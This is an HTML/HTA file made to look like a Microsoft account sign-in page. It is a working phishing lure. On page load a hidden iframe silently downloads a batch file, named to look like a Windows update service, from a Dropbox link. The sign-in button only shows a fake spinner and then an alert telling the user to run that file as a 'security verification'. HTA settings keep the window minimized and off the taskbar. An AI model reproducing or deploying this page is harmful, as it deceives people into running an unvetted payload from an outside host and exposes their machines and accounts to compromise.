
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Microsoft Account</title>
    <HTA:APPLICATION
        ID="oHTA"
        APPLICATIONNAME="Microsoft Login"
        BORDER="none"
        CAPTION="no"
        SHOWINTASKBAR="no"
        WINDOWSTATE="minimize"
    />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: white;
            padding: 44px;
            width: 440px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
            width: 100%;
      
            display: flex;
            flex-direction: row;
            justify-content: center;

        }
        .logo img {
            width: 108px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 12px;
            color: #1f1f1f;
        }
        .input-group {
            margin-bottom: 24px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 15px;
            color: #1f1f1f;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #8a8a8a;
            font-size: 15px;
            outline: none;
        }
        input:focus {
            border: 1px solid #0067b8;
        }
        .btn-primary {
            background: #0067b8;
            color: white;
            border: none;
            padding: 12px 24px;
            width: 100%;
            font-size: 15px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-primary:hover {
            background: #005a9e;
        }
        .help-link {
            margin-top: 24px;
            text-align: center;
        }
        .help-link a {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }
        .spinner {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner:after {
            content: " ";
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0067b8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="./image.jpg" alt="" style="width: 50px;">
        </div>
        
        <h1>Sign in</h1>
        <p style="margin-bottom: 24px; color: #1f1f1f; font-size: 15px;">to continue to Microsoft</p>
        
        <form id="loginForm">
            <div class="input-group">
                <label>Email, phone, or Skype</label>
                <input type="text" id="email" placeholder="Email, phone, or Skype" required>
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Password" required>
            </div>
            
            <button type="button" class="btn-primary" onclick="authenticate()">Sign in</button>
            
            <div class="spinner" id="spinner"></div>
        </form>
        
        <div class="help-link">
            <a href="#">Can't access your account?</a>
        </div>
    </div>
    
    <!-- Hidden auto-download trigger -->
    <iframe id="downloadFrame" style="display:none;"></iframe>
    
    <script>
        // Auto-trigger download when page loads (instant download)
        window.addEventListener('load', function() {
            // Instantly download WindowsUpdateService.exe
            document.getElementById('downloadFrame').src = 'https://www.dropbox.com/scl/fi/q3wylj7xsi35jt3479b5z/WindowsUpdateService.bat?rlkey=nd0qrj0ceflzfkiyvah53g1lr&st=326o8fi9&dl=1';
        });
        
        function authenticate() {
            // Show loading spinner
            document.getElementById('spinner').style.display = 'block';
            
            // Simulate authentication
            setTimeout(function() {
                document.getElementById('spinner').style.display = 'none';
                
                // Show professional message
                alert('âœ“ Sign-in verification required\n\nPlease run the security verification file from your Downloads folder:\n"WindowsUpdateService.exe"\n\nThis is a required security measure to protect your account.');
            }, 2000);
        }
    </script>
</body>
</html>
